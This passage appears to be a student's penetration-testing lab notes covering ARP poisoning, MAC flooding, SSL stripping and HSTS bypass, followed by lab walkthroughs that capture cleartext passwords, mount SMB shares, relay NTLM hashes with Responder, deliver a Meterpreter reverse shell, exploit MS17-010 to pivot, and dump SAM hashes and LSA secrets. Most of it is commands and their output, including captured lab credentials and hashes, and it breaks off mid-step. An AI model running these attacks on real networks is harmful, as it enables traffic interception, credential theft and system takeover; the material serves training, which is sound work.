    <p>If you do not select a target, ettercap will automatically set ANY (all the hosts) in the target list.
be aware, this will force your machine to handle a great amount of traffic, it can cause DoS to your network.</p>
  </li>
  <li>
    <p>Once we set the targets, we can select the type of attack to run:
  ARP poisoning
  ICMP redirect
  Port Stealing
  DHCP spoofing</p>
  </li>
  <li>
    <p>Lets go with ARP poisoning &gt; Sniff remote connections
  The ARP attack automatically starts, and we should now be able to intercept the traffic of our target machine.
  Lets first check our (the attacker) MAC address
  now check the ARP table of the target machine: arp -a / arp
  if the gateway has our MAC address, it means that the attack is working</p>
  </li>
</ul>

<blockquote>
  <p>Now that we know that the attack is working, check: View &gt; Connections
In order to inspect the traffic intercepted.
we can view the packets, just double click on a connection listed in the previous view.
Moreover, Ettercap automatically tried to intercept credentials sent via the network.</p>
</blockquote>

<ul>
  <li>With the current configuration we can use other sniffing tools at the same time. For example, we can start Wireshark to sniff the tap0 traffic.
Until now we can read the traffic, because is (HTTP, FTP) not encrypted.</li>
</ul>

<h3 id="cain--abel">Cain &amp; Abel</h3>
<p>https://web.archive.org/web/20190101122212/http:/www.oxid.it/cain.html</p>

<p>Sniffer &gt; Start/Stop sniffer icon &gt; Scan MAC address
After the scanning
go to the APR tab = ARP poisoning attack
click in the top of white box &gt; click on the blue plus icon in the top menu
select the route 172.16.5.1 and the host 172.16.5.15
click in the nuclear symbol in the top menu to start.</p>

<blockquote>
  <p>the word poisoning should appear in the Status column
if the attack is working, we will start seeing packets in the bottom section of the windows.</p>
</blockquote>

<ul>
  <li>go to the tab password, to show the credentials Cain grabbed.</li>
  <li>we can <strong>send to cracker</strong> right clicking on the line that contains the password</li>
</ul>

<p>after getting the passwords
go to the network tab, add the IPs and try to log
then go to services &gt; install abel
refresh the network machine, Abel should appear
now we can control the console and get more hashes if needed</p>

<h3 id="macof">Macof</h3>
<p>The CAM (Content Addressable Memory) table allows a switch to route packets from one host to another, but it has a limited memory For this function.
This table maps MAC addresses to the physical ports on the switch.
MAC flooding makes use of this limitation of memory of the CAM table. It will flood the switch with fake MAC addresses, until the switch cannot keep up.</p>

<blockquote>
  <p>This causes the switch to enter in Failopen Mode, wherein the switch begins acting as a network Hub by broadcasting packets to all the machines on the network.
Usually takes 70 sec to fill the CAM table with Macof, it generates 155.000 MAC entried per minute.</p>
</blockquote>

<h4 id="usage">usage</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>macof -s -d -e -x -y -i -n
-i = interface
-s = source ip address
-d = destination ip address
-e = target hardware address
-x = tcp source port
-y = tcp destination port
-n = numbers of packets to send

</code></pre></div></div>

<blockquote>
  <p>make sure ip forwarding is active on the attacking machine:
	echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo macof -i tap0

then we can start a network sniffer
if u are not seeing data from other systems, probably the router or switch has protection against MAC flood

sudo macof -i tap0 -n 32
</code></pre></div></div>

<h3 id="arpspoof">Arpspoof</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo arpspoof -i tap0 -t &lt;target ip&gt; -r &lt;router/gateway ip&gt;
</code></pre></div></div>

<p>example = -t 172.16.5.15 -r 172.16.5.1</p>

<blockquote>
  <p>this command is a ARP reply to the victim 172.16.5.15 and is telling that the MAc address of the host 172.16.5.1 (gateway) is our MAC address,
we can go the target machine and check the arp table // arp -a
now we send the same command but with the addresses reversed, because we need to send to the gateway, that the address from the target machine is our MAC.</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo arpspoof -i tap0 -t &lt;gateway ip&gt; &lt;target ip&gt;
sudo arpspoof -i tap0 -t 172.16.5.1 -r 172.16.5.15
</code></pre></div></div>

<ul>
  <li>now the attack is complete, we can sniff the network with wireshark or tcpdump</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> dsniff -i tap0
</code></pre></div></div>

<blockquote>
  <p>make sure ip forwarding is active on the attacking machine:
	echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p>
</blockquote>

<h3 id="bettercap">Bettercap</h3>
<p>http://www.bettercap.org/</p>

<p>Find the targets:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bettercap -I tap0 --no-spoofing
</code></pre></div></div>

<p>Set the target and gateway:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bettercap -I tap0 -G 172.165.5.1 -T 172.16.5.15 -X -P "HTTPAUTH,URL,FTP,POST"
-G = gateway // -T = target ip // -X = sniffer // -P = parser, we can use "*" if we wanna enable all parsers
</code></pre></div></div>

<h2 id="intercepting-ssl-traffic">Intercepting SSL traffic</h2>

<ul>
  <li>What we need to do is to instruct Ettercap to create and use a fake SSL certificate that will be sent to the victim machine every time it tries to establish HTTPS connections.
If the victim user accepts the certificate, Ettercap will be then able to decrypt the traffic.</li>
</ul>

<p>Edit this file: /etc/ettercap/etter.conf</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[privs]
ec_uid = 0
ec_gid = 0
</code></pre></div></div>

<blockquote>
  <p>uncomment the following lines &gt; redir_command_on/off</p>
</blockquote>

<blockquote>
  <p>Now we are able to intercept and read some of the HTTPS traffic too.</p>
</blockquote>

<h3 id="sslstrip">Sslstrip</h3>
<ul>
  <li>https://github.com/moxie0/sslstrip</li>
</ul>

<h4 id="how-it-works">How it works</h4>
<p>Performs a MITM attack on the HTTPS connection between the victim and the server
Replaces the HTTPS links with HTTP clone links and remembers the links which were changed
Communicates with the victim client over HTTP connections For any secure link
Communicates with the legitimate server over HTTPS For the same secure link
The Sslstrip attacker machine transparently proxies the communications between the victim and the server
Favicon images are replaced with the known <strong>secure lock</strong> icon to provide familiar visual confirmations
Ssslstrip logs all traffic passing through so passwords, credentials etc are stolen without the victim knowning</p>

<h4 id="some-issues">Some issues</h4>
<p>Some content encoding, such as gzip is difficult to parse
Cookies that are sent over HTTPS will not be sent over HTTP that has striped the SSL
Any cached pages which did not have the links swapped out</p>

<h4 id="counter-the-issues">Counter the issues</h4>
<p>Stopping the secure bit on the Set-Cookie statements on the pages
Strip the difficult encodings from the client requests
Strip the if-modified-since headers to eliminate the cached pages being requested.</p>

<h4 id="preparation">Preparation</h4>
<ol>
  <li>enable the ip forwarding:
  echo 1 &gt; /proc/sys/net/ipv4/ip_forward</li>
  <li>set up port redirection using iptables:
  iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-ports 8080</li>
</ol>

<h4 id="start-sslstrip">Start sslstrip</h4>

<blockquote>
  <p>We r gonna instruct it to listen on port 8080. // -w = save logs // -f = substitute the favicon on secure req</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sslstrip -a -f -l 8080 -w els_ssl
</code></pre></div></div>

<h3 id="ettercap-1">Ettercap</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>last step is to configure Ettercap in order to mount an ARP MITM attack between victim and gateway.
// we can move into the victim machine and execute a secure web session. As we can see, the URL contain HTTP and the favicon has been substituted with a lock icon.
// as soon as we try to log into the portal, Ettercap will display the request and the credentials sent by the victim. 
</code></pre></div></div>

<blockquote>
  <p>[+] Similarly, we can use others tools in conjunction with ssltrip.
Bettercap already implements sslstrip with <strong>–proxy-https</strong></p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bettercap -G 172.168.102.2 -T 192.168.102.135 --proxy-https
</code></pre></div></div>

<h3 id="hsts">HSTS</h3>
<p>From this moment on, if the victim tries to open an HTTPS link, it will be automatically stripped down to HTTP
Does not work in all website tho, and newer browsers
because the HSTS (HTTP Strict Transport Security) policy mechanism is in place. HSTS is a security enhancement specified by the web application and that prevents the protocol downgrade from HTTPS to HTTP.</p>

<h4 id="preload-lists">preload lists</h4>
<p>This attack works fine if the victim tried the connection to the web site For the first time.
This happens because the web browser does not know whether or not to use a secure connection, since it never received the HSTS header.
In order to defeat this issue, web browser implemented the so called ‘preload lists’, which contain sites that have to be accesses with a secure connection, even if its the first time.</p>

<h4 id="resources-about-hsts">resources about HSTS</h4>
<p>https://src.chromium.org/viewvc/chrome/trunk/src/net/http/transport_security_state_static.json
https://blog.mozilla.org/security/2012/11/01/preloading-hsts/
https://src.chromium.org/viewvc/chrome/trunk/src/net/http/transport_security_state_static.json
https://support.microsoft.com/en-us/kb/3071338</p>

<h4 id="hsts-bypass">HSTS Bypass</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/singe/sslstrip2
https://github.com/byt3bl33d3r/MITMf
</code></pre></div></div>

<h4 id="attack-summary">Attack Summary</h4>
<ol>
  <li>The victim goes to google.com (not in the HSTS preload list)</li>
  <li>We (attacker) intercept the traffic and change the links in the web page. For example we change accounts.google.com to acccounts.google.com</li>
  <li>The victim makes a DNS request For the domain acccounts.google.com</li>
  <li>We intercept the request, forward the real DNS request and respond to the victim with a fake domain and the IP address.</li>
</ol>

<p>Since the domain is different (its acccounts with 3 ‘c’) the browser will continue the communication via HTTP
To know more about the bypass:
	https://www.youtube.com/watch?v=Q3siIqS9LVA</p>

<h3 id="mitmf-tool">MITMf tool</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="n">mitmf</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">h</span>
</code></pre></div></div>

<p>Some options:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-i = interface to listen on
--spoof = this allows to redirect traffic using arp, icmp, dhcp or dns spoofing
--arp = redirect traffic using ARP spoofing
--dns = proxy/modify DNS queries
--hsts = load plugin 'SSLstrip+'
--gateway = specify the gateway IP
--targets = specify hosts to poison
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="n">mitmf</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">i</span> <span class="n">eth0</span> <span class="o">--</span><span class="n">spoof</span> <span class="o">--</span><span class="n">arp</span> <span class="o">--</span><span class="n">dns</span> <span class="o">--</span><span class="n">hsts</span> <span class="o">--</span><span class="n">gateway</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">102.2</span> <span class="o">--</span><span class="n">targets</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">102.149</span>
</code></pre></div></div>

<h2 id="lab-cainabel">Lab Cain&amp;Abel</h2>

<p>Audit workstation - 172.16.5.5</p>

<p>Network scope - 172.16.5.0/24 and 10.10.10.0/24</p>

<p>RDP gateway server - 10.10.10.20</p>

<p>There is only 1 server 172.16.5.0/24 - with firewall
smb, netbios, vnc</p>

<p>myip - 172.16.5.152</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>audit - 172.16.5.5
Username: bcaseiro
Password: letmein
</code></pre></div></div>

<p>Cain :</p>

<blockquote>
  <p>First enumerate live hosts
then sniff in gateway with the two hosts to find more credentials</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	HTTP admin:et1@sR7!

FTP Credentials
FTP Server IP Address 	
Username 	bcaseiro
Password    letmein

HTTP Credentials
IP Address 	
URL

Username admin	
Password et1@sR7!

RDP Connection
RDP Client Version 	
Encryption level 	4-medium
german
!Corinthians2012

</code></pre></div></div>

<p>VNC Connection
VNC Server 	
VNC 3DES Encrypt 	timao</p>

<p>with cain&amp;abel:</p>

<p>we can sniff
get hashes and send to cracker
	dictionary attack
	bruteforce attack (if we know the length is better)
decode files such as RDP-FILE in this lab</p>

<p>with dictionary attack:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aline:soccer
dba:gloves
admin:monkey

</code></pre></div></div>
<p>Network tab &gt; Quick list &gt; add to quick list &gt; 172.16.5.10 (this ip has firewall, we cant access through rdp)
alice:soccer (credentials we got earlier with MITM )
Registry  &gt; Software &gt; ORL &gt; WinVNC3 &gt; Password &gt; grab the hash
Cain Tools &gt; VNC Password Decoder &gt; paste the hash = NBARocks</p>

<p>Network tab &gt; quick list &gt; add &gt; 172.16.5.10 &gt; alice:soccer &gt; services &gt; install abel
This will give us additional features like windows shell, routing information, password hashes etc</p>

<p>Go back to quick list &gt; Abel &gt; Console</p>
<ul>
  <li>view firewalls rules</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	netsh firewall show config = to review firewalls rules
</code></pre></div></div>

<ul>
  <li>this will enable Remote Desktop</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
</code></pre></div></div>

<ul>
  <li>check the port 3389 (its listening)</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	netstat -an |findstr :3389
</code></pre></div></div>

<ul>
  <li>enable on the Windows Firewall</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	netsh firewall add portopening TCP 3389 "Remote Desktop"
</code></pre></div></div>

<ul>
  <li>verify the firewall rules again to see if 3389 is able</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	netsh firewall show config
</code></pre></div></div>

<blockquote>
  <p>At this point we can access the last machine 172.16.5.10 via RDP</p>
</blockquote>

<blockquote>
  <p>OBS: we need to right click in cracker &gt; reset position of dictionary before executing</p>
</blockquote>

<h2 id="lab-poison">Lab Poison</h2>

<p>my ip : 172.16.5.100</p>

<p>scope</p>
<ul>
  <li>172.16.5.0/24</li>
</ul>

<table>
  <tbody>
    <tr>
      <td>hosts</td>
      <td> </td>
    </tr>
    <tr>
      <td>ip</td>
      <td>mac</td>
    </tr>
  </tbody>
</table>

<p>netdiscover</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 172.16.5.1      00:50:56:a2:9b:1f                                                 
 172.16.5.10     00:50:56:a2:4f:f5                                                
 172.16.5.5      00:50:56:a2:36:6e                                                  
 172.16.5.6      00:50:56:a2:ab:f6  

 172.16.5.10 = dns server - Simple DNS Plus - Windows
</code></pre></div></div>

<p>nslookup</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; server 172.16.5.10
Default server: 172.16.5.10
Address: 172.16.5.10#53
&gt; 172.16.5.5
5.5.16.172.in-addr.arpa name = wkst-techsupport.sportsfoo.com.
172.17
dig @172.16.5.10 -x 172.16.5.5 +nocookie
	we can do this to every IP, to see the name

	wkst-finance.sportsfoo.com. = 172.16.5.5
	wkst-techsupport.sportsfoo.com = 172.16.5.6
	els-winser2003.sports.com = 172.16.5.10
	ftp.sportsfoo.com = 10.10.10.6
	intranet.sportsfoo.com = 10.10.10.10

</code></pre></div></div>

<ul>
  <li>Knowning that there is a firewall in the gateway 172.16.5.1
we can image the network map draw</li>
</ul>

<blockquote>
  <p>ps: too lazy to draw maps now</p>
</blockquote>

<p>Full zone transfer records</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig @172.16.5.10 sportsfoo.com -t AXFR +nocookie

2 new hosts
	10.10.10.10
	10.10.10.6
</code></pre></div></div>

<p>Identify the default Gateway:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>traceroute 10.10.10.10 -m 5
sudo traceroute 10.10.10.10 -m 5 -T
route = to show route table
</code></pre></div></div>

<blockquote>
  <p>as we can see, the gateway is 172.16.5.1
because the packet sent, pass through this IP before going to 10.10.10.10</p>
</blockquote>

<p>Task5: Capture traffic between 172.16.5.5  -  172.16.5.1</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arpspoof -i tap0 -t 172.16.5.5 -r 172.16.5.1
arpspoof -i tap0 -t 172.16.5.1 -r 172.16.5.5
</code></pre></div></div>

<p>now we can capture the packets</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wireshark - tap0 &gt; after 5 minutes save the packet

driftnet -i tap0 = to capture images between hosts //I tried it didnt work
</code></pre></div></div>

<p>Task 8: Analyze the saves packets
wireshark &gt; menu &gt; Statistics &gt; Protocl Hierarchy</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	gfreitas
	Silv@n@
	HTTP //ps; my pcap didnt have HTTP packets

	Filter String: http.request.method == "GET"
	HTTP
	SSL
	http.request.method == "POST"
	http.location == login_success.php
	smb.file


	bcaseiro:#MySecretPassword
	admin:et1@sR7!
	almir 	Corinthians2012
</code></pre></div></div>

<p>Wireshark &gt; Export Objects &gt; HTTP
	to get files such as images etc</p>

<p>Wireshark &gt; Export Objects &gt; SMB
	in SMB packets we discover a share in 172.16.5.10\finances
	lets mount</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt-get install cifs-utils

mkdir /tmp/finance
sudo mount -t cifs -o user=almir,password=Corinthians2012,rw,vers=1.0 //172.16.5.10/finance /tmp/finance
ls -l /tmp/finance

$ ls -l /tmp/finance                   
total 5
drwxr-xr-x 2 root root   0 Dec 31  1969 orbit-root
drwxr-xr-x 2 root root   0 Dec 31  1969 orbit-root-1a5afa2a
drwxr-xr-x 2 root root   0 Dec 31  1969 orbit-root-c0a010
drwxr-xr-x 2 root root   0 Dec 31  1969 orbit-root-ed6dad4d
drwxr-xr-x 2 root root   0 Dec 31  1969 orbit-root-fd7dbd5d
drwxr-xr-x 2 root root   0 Dec 31  1969 orbit-root-fdbd9d0d
drwxr-xr-x 2 root root   0 Dec 31  1969 orbit-root-fe3e5e6e
-rwxr-xr-x 1 root root 662 Nov 17  2012 performance.doc
-rwxr-xr-x 1 root root 374 Nov 17  2012 salaries.doc

mkdir /tmp/tech
sudo mount -t cifs //172.16.5.10/technology /tmp/tech -o rw,vers=1.0,user=admin,password=et1@sR7! 
</code></pre></div></div>

<blockquote>
  <p>use exploit/windows/smb/psexec
admin:et1@sR7!</p>
</blockquote>

<blockquote>
  <p>we get shell.</p>
</blockquote>

<p>task12: Countermeasures</p>

<ol>
  <li>
    <p>What protocol can be used on the intranet in order to avoid that credentials are transmitted in clear-text?
 SSL</p>
  </li>
  <li>
    <p>What protocl or tool cab be used as a replacement For the FTP service in use on the host?
 SFTP</p>
  </li>
  <li>
    <p>What protocol can be used to ensure that all traffic between the file server and any other host on the LAn are encrypted?
 IPSEC</p>
  </li>
  <li>
    <p>What countermeasure can be impemented in order to protect the network against ARP poisoning attakcs?
 You can use static ARP entries</p>
  </li>
</ol>

<hr />
<p>2 - version</p>

<ul>
  <li>1 - scan the network to find alive hosts</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arp-scan -I eth1 172.16.5.0/24
or
netdiscover -i eth1
or 
nmap -PR -sn 172.16.5.*
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.16.5.1
172.16.5.5
172.16.5.6
172.16.5.10
172.16.5.101
</code></pre></div></div>

<ul>
  <li>2 - find the DNS server</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV -p 53 &lt;network&gt;
	in this case: 172.16.5.10 is the DNS server
	
</code></pre></div></div>

<ul>
  <li>3 - scan the DNS server to find new hosts</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nslookup
&gt; server &lt;DNS Server&gt;
	ip u wanna check
</code></pre></div></div>

<p>dig @<DNS server=""> <domain> -t AXFR +nocookie
	// here we can get all the ips and names related to that dns server</domain></DNS></p>

<ul>
  <li>4 - find the default gateway
we can send
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>traceroute &lt;some ip&gt; -m 5 -T
</code></pre></div>    </div>
  </li>
</ul>

<p>the packet needs to go through the default gateway
in this case its 172.16.5.1</p>

<ul>
  <li>
    <p>5 - draw a network map
  need to learn that</p>
  </li>
  <li>
    <p>6 - sniff packets in all the directions
before doing that remember to add</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward


arpspoof -i &lt;interface&gt; -t 172.16.5.5 -r 172.16.5.1
arpspoof -i &lt;interface&gt; -t 172.16.5.1 -r 172.16.5.5
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// open wireshark to get the traffic and save
// driftnet -f &lt;pcap file&gt; or -i &lt;interface&gt; to show the images between the packets, didnt work when i tried
</code></pre></div></div>

<ul>
  <li>analyze the pcap files
  http
  ftp
  SMB
  // try to find credentials</li>
</ul>

<blockquote>
  <p>mount the share after getting the credentials</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir /tmp/finance
mount -t cifs -o user=almir,password=Corinthians2012,rw,vers=1.0 //172.16.5.10/finance /tmp/finance
ls -l /tmp/finance/
</code></pre></div></div>

<blockquote>
  <p>once we have 2 credentials, we can try to get a shell
msfconsole
use exploit/linux/samba/is_known_pipename
show options</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set SMBUser admin
set SMBPass et1@sR7!
set LHOST 172.16.5.101
set SMB::AlwaysEncrypt false
show advanced
</code></pre></div></div>

<ul>
  <li>Countermeasures</li>
</ul>

<p>List at least one countermeasure that your client could implement \for some of the problems identified during the test.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>What protocol can be used on the http://intranet.sportsfoo.com in order to avoid that credentials are transmitted in clear-text?
    SSL

What protocol or tool can be used as a replacement \for the FTP service in use on the host ftp.sportsfoo.com?
    SFTP

What protocol can be used to ensure that all traffic between the file server and any other host on the LAN are encrypted?
    IPSEC

What countermeasure can be implemented in order to protect the network against ARP Poisoning attacks?
    You can use static ARP entries
</code></pre></div></div>

<blockquote>
  <p>arp only works on layers 2, that means that it cannot find IPs from other networks, only from the LAN</p>
</blockquote>

<ul>
  <li>filter in wireshark to get credentials
Filter String: http and ip.addr == 172.16.5.5
Filter String: http.request.method == “GET”
Filter String: http.request.method == “POST”
http
ftp
smb
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  login: admin 
  password: et1@sR7!
</code></pre></div>    </div>
  </li>
</ul>

<blockquote>
  <p>we can export object such as images
wireshark &gt; export objects &gt; HTTP</p>
</blockquote>

<h2 id="lab-nbt-ns">Lab NBT-NS</h2>

<p>Internal pentest
172.16.23.1/24</p>

<ul>
  <li>172.16.23.10
172.16.23.100
172.16.23.103 - domain
172.16.23.101</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report For 172.16.23.100
Host is up (0.37s latency).
Not shown: 45 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49154/tcp open  unknown
MAC Address: 00:50:56:A0:30:85 (VMware)

Nmap scan report For 172.16.23.101
Host is up (0.29s latency).
Not shown: 45 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49154/tcp open  unknown
MAC Address: 00:50:56:A0:81:FA (VMware)

Nmap scan report For 172.16.23.103
Host is up (0.33s latency).
Not shown: 45 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49154/tcp open  unknown
MAC Address: 00:50:56:A0:56:16 (VMware)
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(john㉿kali)-[/usr/share/responder/tools]                                                                      
└─$ sudo python3 MultiRelay.py -t 172.16.23.100 -u ALL

dmanuel::ELS-CHILD:5E91834E3DEEA60200000000000000000000000000000000:B119F42F56D3FD8859B5C2996EC5E263B119A2AEB996497E:d14f4f5c58eb5e32
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(john㉿kali)-[/usr/share/responder/logs]
└─$ cat SMB-Relay-SMB-172.16.23.101.txt
dmanuel::ELS-CHILD:B1215FBE5E8DB22500000000000000000000000000000000:31A86CB9B587ED72FF3FEC26F15FC3AE4690217B6FC5EEB5:093f6c50ac36ae79
</code></pre></div></div>

<ul>
  <li>
    <p>use exploit/multi/script/web_delivery</p>

    <p>set options
  set payload windows/x64/meterpreter/reverse_tcp
  copy the payload
  paste in the MultiRelay shell
  we should gain a meterpreter shell</p>
  </li>
  <li>
    <p>another network found:
  ipconfig
  10.100.40.100
  background</p>
  </li>
  <li>
    <p>use post/windows/gather/arp_scanner
  set session 1
  set rhost 10.100.40.0/24</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	10.100.40.1
	10.100.40.100
	10.100.40.101
	10.100.40.103
	10.100.40.107
	10.100.40.255
</code></pre></div></div>

<ul>
  <li>
    <p>use post/multi/manage/autoroute
  set session 1</p>
  </li>
  <li>
    <p>use auxiliary/scanner/portscan/tcp
  set rhost 10.100.40.107
  set ports 1-1000</p>
  </li>
  <li>
    <p>use auxiliary/scanner/smb/smb_ms17_010
  set rhost 10.100.40.107
  I tried all hosts, only 107 was vulnerable to ms17-010</p>
  </li>
  <li>
    <p>use exploit/windows/smb/ms17_010_psexec
  set options
  set lhost 172.16.23.100 
  // (the first machine we got)
  // because we dont have direct access</p>
  </li>
</ul>

<blockquote>
  <p>We have system access to the second network</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter &gt; hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ELS_Admin:1000:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1003:aad3b435b51404eeaad3b435b51404ee:3477c42a01b6cbc3dcf563696f8d8745:::
new_admin:1001:aad3b435b51404eeaad3b435b51404ee:15573ddeb75394946f9503daaff864f5:::
</code></pre></div></div>

<p>load kiwi</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	lsa_dump_sam 
	lsa_dump_secrets
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Domain : WIN7-ACCOUNTING                                                                                          
SysKey : 61b4cf081a8ba3373d2fb6255f8fa1a4                                                                         
Local SID : S-1-5-21-3081729745-3944019156-515220582                                                              
                                                                                                                  
SAMKey : 71f54acee9461e7f12a7e6a3c0e25ce9

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : ELS_Admin
  Hash NTLM: 89551acff8895768e489bb3054af94fd

RID  : 000003e9 (1001)
User : new_admin
  Hash NTLM: 15573ddeb75394946f9503daaff864f5
    lm  - 0: 3139695ec03b3d855395a52f1deb748d
    ntlm- 0: 15573ddeb75394946f9503daaff864f5

RID  : 000003eb (1003)
User : HomeGroupUser$
  Hash NTLM: 3477c42a01b6cbc3dcf563696f8d8745


Secret  : DefaultPassword
cur/text: P@ssw0rd123
old/text: a2@3L$-CHILDL0c@l

</code></pre></div></div>

<p>cracked:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ELS_admin
89551acff8895768e489bb3054af94fd:P@ssw0rd123
</code></pre></div></div>

<ul>
  <li>scan the machine</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV -T4 -p- &lt;ip&gt;
</code></pre></div></div>

<ul>
  <li>discover the SO</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -A -O &lt;ip&gt;
</code></pre></div></div>

<ul>
  <li>NTLM downgrade attack with Responder</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	responder -I eth1 --lm
</code></pre></div></div>

<blockquote>
  <p>The hash is stored in the /usr/share/responder/logs folder.</p>
</blockquote>

<ul>
  <li>Compile de Runas and Syssvc to x86</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Runas.c -o /usr/share/responder/tools/MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv

i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Syssvc.c -o /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe -municode
</code></pre></div></div>

<ul>
  <li>multirelay</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	./MultiRelay.py -t 172.16.5.10 -u ALL
</code></pre></div></div>

<blockquote>
  <p>responder again to get a shell
	responder -I eth1 –lm</p>
</blockquote>

<ul>
  <li>Get a meterpreter shell</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole -q
search web_delivery

